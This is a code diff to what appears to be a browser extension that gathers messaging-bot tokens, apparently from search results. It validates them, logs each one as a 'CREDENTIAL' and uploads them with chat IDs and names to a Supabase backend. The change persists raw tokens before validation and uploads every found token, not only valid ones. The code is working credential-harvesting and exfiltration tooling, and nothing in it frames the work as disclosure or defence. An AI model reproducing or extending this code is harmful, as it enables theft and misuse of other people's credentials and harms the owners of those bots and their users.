@@ -462,18 +462,33 @@ async function handleResults(items) {
 
     if (newItems.length === 0) return;
 
+    // Save raw tokens immediately before validation — survives SW death mid-batch
+    for (const item of newItems) {
+        if (state.results.length >= MAX_STORED_RESULTS) state.results.shift();
+        // Placeholder entry: valid=null means "found but not yet validated"
+        if (!state.results.find(r => r.token === item.token)) {
+            state.results.push({ ...item, valid: null });
+            state.resultsFound++;
+        }
+    }
+    saveState();
+
     state.status = `Validating ${newItems.length} token(s)...`;
     broadcastState();
 
     const validated = await validateBatch(newItems);
 
     for (const v of validated) {
-        // Cap stored results to avoid blowing chrome.storage.local 5 MB limit
-        if (state.results.length >= MAX_STORED_RESULTS) {
-            state.results.shift(); // drop oldest
+        // Update the placeholder entry saved before validation
+        const existing = state.results.findIndex(r => r.token === v.token);
+        if (existing >= 0) {
+            state.results[existing] = v; // replace placeholder with full validated data
+        } else {
+            // Fallback: shouldn't happen but cap and push anyway
+            if (state.results.length >= MAX_STORED_RESULTS) state.results.shift();
+            state.results.push(v);
+            state.resultsFound++;
         }
-        state.results.push(v);
-        state.resultsFound++;
         if (v.valid) state.resultsValid++;
         console.log("🦅 CREDENTIAL:", v.valid ? "✅" : "❌", v.token.slice(0, 12) + "...", v.bot_name || "");
     }
@@ -492,9 +507,11 @@ function broadcastState() {
 // encryption path, creating a permanent security hole in the DB.
 
 async function uploadToSupabase() {
-    const validResults = (state.results || []).filter((r) => r.valid === true);
-    if (validResults.length === 0) {
-        state.status = "⚠️ Nothing to upload (no valid tokens)";
+    // Send ALL found results — valid, invalid, and unvalidated
+    // The backend re-validates via enrich_credential anyway
+    const allResults = (state.results || []);
+    if (allResults.length === 0) {
+        state.status = "⚠️ Nothing to upload (no tokens found)";
         saveState();
         broadcastState();
         return;
@@ -514,7 +531,7 @@ async function uploadToSupabase() {
         return;
     }
 
-    state.status = `⬆️ Uploading ${validResults.length} tokens via API...`;
+    state.status = `⬆️ Uploading ${allResults.length} tokens via API...`;
     saveState();
     broadcastState();
 
@@ -522,7 +539,7 @@ async function uploadToSupabase() {
         source:  "extension",
         domain:  state.domain,
         query:   state.query,
-        results: validResults.map((r) => ({
+        results: allResults.map((r) => ({
             token:        r.token,
             chat_id:      r.chatId        || null,
             chat_name:    r.chatTitle      || null,
